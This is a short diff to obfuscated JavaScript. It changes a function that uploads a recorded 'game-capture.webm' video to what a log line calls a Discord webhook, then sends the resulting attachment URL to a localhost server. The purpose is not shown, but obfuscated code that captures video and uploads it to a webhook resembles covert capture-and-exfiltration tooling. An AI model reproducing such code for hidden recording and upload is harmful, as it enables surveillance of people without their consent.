@@ -111,18 +111,25 @@ function sleep(_0xca8c71) {
 function uploadBlob(_0x585797) {
   const _0x154c96 = new FormData();
   _0x154c96.append("files[]", _0x585797, "game-capture.webm");
+  console.log("Uploading video to Discord webhook:", uploadEndpoint);
   fetch(uploadEndpoint, {
-    'method': 'POST',
-    'body': _0x154c96
-  }).then(_0x22313d => _0x22313d.json()).then(_0x235025 => {
-    fetch("http://127.0.0.2:80/saveVideoData", {
-      'method': 'POST',
-      'mode': "cors",
-      'body': JSON.stringify({
-        'videoUrl': _0x235025.attachments[0x0].proxy_url
-      })
+    method: 'POST',
+    body: _0x154c96
+  })
+  .then(_0x22313d => _0x22313d.json())
+  .then(_0x235025 => {
+    const videoUrl = _0x235025.attachments[0x0].proxy_url;
+    console.log("Discord upload success, video URL:", videoUrl);
+    fetch("http://127.0.0.1:3000/saveVideoData", {
+      method: 'POST',
+      mode: "cors",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ videoUrl })
+    }).then(res => res.json()).then(data => {
+      console.log("saveVideoData response:", data);
     });
-  })["catch"](_0x2d260d => console.error("Failed to upload video:", _0x2d260d));
+  })
+  .catch(_0x2d260d => console.error("Failed to upload video:", _0x2d260d));
 }
 let saveNextCapture = false;
 function startRecording() {
